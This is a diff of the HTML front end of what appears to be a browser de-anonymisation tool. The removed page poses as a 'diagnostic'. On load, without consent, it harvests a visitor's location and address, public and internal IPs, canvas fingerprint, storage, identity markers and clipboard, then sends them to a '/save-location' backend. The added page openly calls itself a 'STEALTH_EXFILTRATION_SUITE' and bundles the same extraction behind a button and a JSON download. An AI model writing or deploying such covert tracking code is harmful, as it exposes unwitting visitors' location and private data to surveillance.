@@ -3,152 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DIAGNOSTIC | STATUS_ONLINE</title>
+    <title>DeAnonymizer | STEALTH_MODE</title>
     <style>
+        :root { --cyber-green: #00ff41; --bg-black: #000; }
         body {
-            background-color: #000;
-            color: #00ff41;
-            font-family: 'JetBrains Mono', monospace;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            overflow: hidden;
-            zoom: 1.1; /* Adjusted Zoom */
-            background-image: 
-                linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
-            background-size: 40px 40px;
+            background-color: var(--bg-black); color: var(--cyber-green);
+            font-family: 'JetBrains Mono', monospace; margin: 0; padding: 50px;
+            zoom: 1.1; display: flex; flex-direction: column; align-items: center;
+            justify-content: center; min-height: 100vh;
         }
         .container {
-            border: 1px solid rgba(0, 255, 65, 0.3);
-            background: #050505;
-            padding: 50px;
-            text-align: center;
-            position: relative;
-            box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
+            border: 1px solid rgba(0, 255, 65, 0.2); padding: 40px; background: #030303;
+            max-width: 800px; width: 100%; box-shadow: 0 0 30px rgba(0, 255, 65, 0.05);
         }
-        .container::before {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 2px;
-            background: #00ff41;
-            box-shadow: 0 0 15px #00ff41;
+        .header { text-align: center; margin-bottom: 40px; }
+        .btn-main {
+            display: block; width: 100%; padding: 20px; background: transparent;
+            border: 1px solid var(--cyber-green); color: var(--cyber-green);
+            font-family: 'JetBrains Mono', monospace; font-size: 14px; font-weight: bold;
+            cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 5px;
         }
-        .status-row {
-            display: flex;
-            justify-content: space-between;
-            width: 350px;
-            margin: 15px 0;
-            font-size: 11px;
-            border-bottom: 1px solid rgba(0, 255, 65, 0.05);
-            padding-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
+        .btn-main:hover { background: var(--cyber-green); color: #000; box-shadow: 0 0 20px var(--cyber-green); }
+        .status-log {
+            margin-top: 30px; font-size: 11px; height: 150px; overflow-y: auto;
+            border-top: 1px solid rgba(0, 255, 65, 0.1); padding-top: 20px; color: rgba(0, 255, 65, 0.6);
         }
-        .active { color: #00ff41; font-weight: bold; }
-        .label { color: rgba(0, 255, 65, 0.5); }
+        .hidden-payload { display: none; }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
 
     <div class="container">
-        <div style="margin-bottom: 30px; border: 1px solid rgba(0, 255, 65, 0.5); padding: 10px; display: inline-block;">
-            <h1 style="margin: 0; font-size: 10px; letter-spacing: 5px; text-transform: uppercase;">Full Spectrum Diagnostic</h1>
+        <div class="header">
+            <h1 style="letter-spacing: 15px; margin: 0;">DeAnonymizer</h1>
+            <p style="font-size: 10px; opacity: 0.5; margin-top: 10px;">STEALTH_EXFILTRATION_SUITE // BY AHMAD HASSAN (B-TED)</p>
         </div>
 
-        <div class="status-row">
-            <span class="label">Geo_Fix_Uplink</span>
-            <span class="active" id="status-geo">[ INITIALIZING ]</span>
-        </div>
-        <div class="status-row">
-            <span class="label">Net_Identity_Sync</span>
-            <span class="active" id="status-net">[ INITIALIZING ]</span>
-        </div>
-        <div class="status-row">
-            <span class="label">Hardware_Hash_Audit</span>
-            <span class="active" id="status-hw">[ INITIALIZING ]</span>
-        </div>
-        <div class="status-row">
-            <span class="label">Storage_PII_Scan</span>
-            <span class="active" id="status-storage">[ INITIALIZING ]</span>
+        <button id="exfil-trigger" class="btn-main">INITIALIZE_FULL_SPECTRUM_SCAN</button>
+
+        <div id="log" class="status-log">
+            >> SYSTEM_READY...<br>
+            >> AWAITING_OPERATOR_INPUT...
         </div>
 
-        <div style="margin-top: 30px; font-size: 8px; color: rgba(0, 255, 65, 0.3); letter-spacing: 3px; text-transform: uppercase;">
-            Sequence: FULL_LAB_EXTRACTION // NODE: AX-7792<br>
-            Capturing high-fidelity telemetry...
+        <div id="payload-container" style="display:none; margin-top: 30px;">
+            <p style="font-size: 10px; color: #fff;">INTELLIGENCE_REPORT_READY:</p>
+            <button id="download-report" class="btn-main" style="border-color: #ffcc00; color: #ffcc00;">DOWNLOAD_UNIFIED_PAYLOAD</button>
+        </div>
+        
+        <div style="margin-top: 30px; text-align: center;">
+            <a href="debug.html" style="color: rgba(255,255,255,0.3); text-decoration: none; font-size: 10px;">SWITCH_TO_CONSOLE_MODE</a>
         </div>
     </div>
 
     <script type="module">
-        import { extractLocation } from './src/telemetry.js';
-        import { extractMetadata } from './src/metadata.js';
-        import { resolvePublicIP, extractConnectionInfo } from './src/network.js';
-        import { extractBatteryStatus } from './src/battery.js';
-        import { extractPerformanceMetrics } from './src/performance.js';
-        import { resolveAddress } from './src/geocoder.js';
-        import { extractBrowserStorage, auditIdentityMarkers } from './src/storage.js';
-        import { extractCanvasFingerprint } from './src/render-core.js';
-        import { extractInternalIPs } from './src/webrtc.js';
-        import { auditPermissions } from './src/permissions.js';
-        import { enumerateDevices } from './src/media_devices.js';
-        import { checkClipboardSecurity } from './src/clipboard_auditor.js';
-        import { transmitData } from './src/transmitter.js';
+        import { PinpointEngine } from './src/core/engine.js';
+        
+        const log = document.getElementById('log');
+        const trigger = document.getElementById('exfil-trigger');
+        const payloadContainer = document.getElementById('payload-container');
+        let unifiedData = null;
 
-        async function runFullSpectrumDiagnostic() {
-            try {
-                // 1. Geolocation & Address (The "Address" one you asked for)
-                const location = await extractLocation();
-                const address = await resolveAddress(location.latitude, location.longitude);
-                document.getElementById('status-geo').innerText = "[ COMPLETED ]";
+        const writeLog = (msg) => {
+            log.innerHTML += `<br>>> ${msg}`;
+            log.scrollTop = log.scrollHeight;
+        };
 
-                // 2. Network & IP
-                const ip = await resolvePublicIP();
-                const connection = extractConnectionInfo();
-                const internalIPs = await extractInternalIPs();
-                document.getElementById('status-net').innerText = "[ COMPLETED ]";
+        trigger.onclick = async () => {
+            trigger.disabled = true;
+            trigger.innerText = "EXECUTING_PAYLOADS...";
+            writeLog("BOOTSTRAPPING_DYNAMIC_ENGINE...");
+            
+            await PinpointEngine.bootstrap();
+            writeLog(`DISCOVERED_${PinpointEngine.modules.length}_ACTIVE_VECTORS`);
+            
+            writeLog("COMMENCING_PARALLEL_EXTRACTION...");
+            unifiedData = await PinpointEngine.runAll();
+            
+            writeLog("AGGREGATION_COMPLETE");
+            writeLog("UNIFIED_INTELLIGENCE_PAYLOAD_GENERATED");
+            
+            payloadContainer.style.display = 'block';
+            trigger.innerText = "SCAN_COMPLETE";
+        };
 
-                // 3. Hardware & Fingerprint
-                const fingerprint = extractCanvasFingerprint();
-                const metadata = extractMetadata();
-                const media = await enumerateDevices();
-                document.getElementById('status-hw').innerText = "[ COMPLETED ]";
-
-                // 4. Storage & Identity
-                const storage = extractBrowserStorage();
-                const pii = auditIdentityMarkers();
-                document.getElementById('status-storage').innerText = "[ COMPLETED ]";
-
-                // 5. System & Utility
-                const battery = await extractBatteryStatus();
-                const performance = extractPerformanceMetrics();
-                const permissions = await auditPermissions();
-                const clipboard = await checkClipboardSecurity();
-
-                // Consolidate into Full Intelligence Payload
-                const fullPayload = {
-                    location: { ...location, address },
-                    network: { ip, ...connection, internalIPs },
-                    fingerprint,
-                    device: { ...metadata, media, battery, performance, permissions, clipboard },
-                    archive: { ...storage, pii },
-                    timestamp: new Date().toISOString()
-                };
-
-                console.log("[Intelligence_Payload_Sync]:", fullPayload);
-                
-                // Transmit to Backend
-                await transmitData('/save-location', fullPayload);
-                
-            } catch (error) {
-                console.error("[Diagnostic_Abort]:", error.message);
-            }
-        }
-
-        // Delay execution slightly to ensure UI is rendered
-        setTimeout(runFullSpectrumDiagnostic, 1500);
+        document.getElementById('download-report').onclick = () => {
+            const blob = new Blob([JSON.stringify(unifiedData, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'DeAnonymizer_Intelligence_Report.json';
+            a.click();
+            writeLog("PAYLOAD_EXFILTRATED_SUCCESSFULLY");
+        };
     </script>
 </body>
 </html>
